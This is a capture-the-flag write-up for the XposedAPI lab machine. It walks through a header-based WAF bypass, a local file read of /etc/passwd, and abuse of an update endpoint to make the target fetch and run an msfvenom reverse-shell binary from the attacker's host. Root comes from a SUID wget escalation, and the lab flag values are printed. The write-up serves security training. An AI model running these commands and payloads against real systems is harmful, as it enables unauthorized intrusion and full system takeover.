# CTF Writeup: XposedAPI

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.237.134
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-29 04:19 -0500
Nmap scan report for 192.168.237.134
Host is up (0.029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
13337/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Remote Software Management API
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   27.21 ms 192.168.45.1
2   27.21 ms 192.168.45.254
3   27.58 ms 192.168.251.1
4   27.23 ms 192.168.237.134

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.10 seconds
```

The webpage running on port 13337 seems to be an exposed api endpoint called "Remote Software Management API".

There is an API Index.


```
Usage:

/

Methods: GET

Returns this page.

/version

Methods: GET

Returns version of the app running.

/update

Methods: POST

Updates the app using a linux executable. Content-Type: application/json {"user":"<user requesting the update>", "url":"<url of the update to download>"}

/logs

Methods: GET

Read log files.

/restart

Methods: GET

To request the restart of the app.
```

There seems to be an option, when sending an GET Request to the /log endpoint. After doing so we get the information that we are getting blocked by WAF Firewall.

```
curl -X GET http://192.168.237.134:13337/logs                                        
WAF: Access Denied for this Host.
```

We can use an advanced web attack called "HTTP Header Attack". To potentially bypass this!

```
# HTTP Headers for exploit
Host
X-Forwarded-Host
X-Forwarded-For
X-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded
```

Utilized the following on order to get bypass the Firewall.

```
curl http://192.168.237.134:13337/logs -H "X-Forwarded-For:localhost"
Error! No file specified. Use file=/path/to/log/file to access log files.
```

The Error response seems rather interesting, is there an LFI vuln?

```
curl http://192.168.237.134:13337/logs?file=/etc/passwd -H "X-Forwarded-For:localhost"
<html>
    <head>
        <title>Remote Software Management API</title>
        <link rel="stylesheet" href="static/style.css"
    </head>
    <body>
        <center><h1 style="color: #F0F0F0;">Remote Software Management API</h1></center>
        <br>
        <br>
        <h2>Attention! This utility should not be exposed to external network. It is just for management on localhost. Contact system administrator(s) if you find this exposed on external network.</h2> 
        <br>
        <br>
        <div class="divmain">
            <h3>Log:</h3>
            <div class="divmin">
            root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh

            </div>
        </div>
    </body>
</html>
```

Yes there is!

But this functionality only provides file read.

Moving onto the /update API endpoint, the website provides us with an template.

```


/update

Methods: POST

Updates the app using a linux executable. Content-Type: application/json {"user":"<user requesting the update>", "url":"<url of the update to download>"}

```

Since we got an username, we can utilize it now maybe and embedd request from the target server to our local server, to potentially download an reverse shell script onto the webroot or smth.

Started up my python server locally.

```
python3 -m http.server 80
```

Sent an request to the server, so the server sends an request as user "clumsyadmin" to my server, which will download my webshell script.

```
curl -X POST http://192.168.237.134:13337/update -H "Content-Type: application/json" --data '{"user":"clumsyadmin","url":"http://192.168.45.164/wolfswebshell.php"}'
Update requested by clumsyadmin. Restart the software for changes to take effect.
```

Verified that the script got downloaded.

```
python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.237.134 - - [29/Dec/2025 05:16:37] "GET /wolfswebshell.php HTTP/1.1" 200 -
```

Since I wasn't able to call the webshell in the webroot, I'm assuming we can trigger an payload via another API endpoint, let's generate an reverse shell payload and upload it instead of the webshell.

```
msfvenom -p linux/x64/shell_reverse_tcp lhost=192.168.45.164 lport=80 -f elf > shell
```

Downloaded the file onto the target system. The answer from the server, provides us with information that we have to restart the system, which we can do with sending an GET Request to the /restart endpoint.

```
curl -X POST http://192.168.237.134:13337/update -H "Content-Type: application/json" --data '{"user":"clumsyadmin","url":"http://192.168.45.164/shell"}'            
Update requested by clumsyadmin. Restart the software for changes to take effect.
```

Let's start up our listener on port 80.

```
nc -lvnp 80
```

Sending an get request to the /restart endpoint, to restart the server & trigger our reverse shell.

```
curl http://192.168.237.134:13337/restart                                             
<html>
    <head>
        <title>Remote Service Software Management API</title>
        <script>
            function restart(){
                if(confirm("Do you really want to restart the app?")){
                    var x = new XMLHttpRequest();
                    x.open("POST", document.URL.toString());
                    x.send('{"confirm":"true"}');
                    window.location.assign(window.location.origin.toString());
                }
            }
        </script>
    </head>
    <body>
    <script>restart()</script>
    </body>
</html>
```

It tells us to change the request to POST, so we can restart the system.

```
curl -X POST http://192.168.237.134:13337/restart
Restart Successful.
```

Gained RCE as user "clumsyadmin".

```
nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.164] from (UNKNOWN) [192.168.237.134] 48426
whoami
clumsyadmin
```

Retrieved local.txt in /home/clumsyadmin directory.

```
4fa014908977d48899cb5f0b6c5673cd
```

## Privilege Escalation

Performed Shell Hardening

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns rows 200
export TERM=xterm
```

Enumerated binaries with the SUID set.

```
clumsyadmin@xposedapi:/home/clumsyadmin$ find / -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/wget
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
```

The /wget binary seems rather interesting.

Utilized the PoC from www.gtfobins.github.io in order to get RCE as user "root".

```
clumsyadmin@xposedapi:/home/clumsyadmin$ TF=$(mktemp)
clumsyadmin@xposedapi:/home/clumsyadmin$ chmod +x $TF
clumsyadmin@xposedapi:/home/clumsyadmin$ echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
clumsyadmin@xposedapi:/home/clumsyadmin$ /usr/bin/wget --use-askpass=$TF 0
# whoami
root
```

Retrieved proof.txt in /root directory.

```
36fd766115c53d91b0dcb856f3081585
```
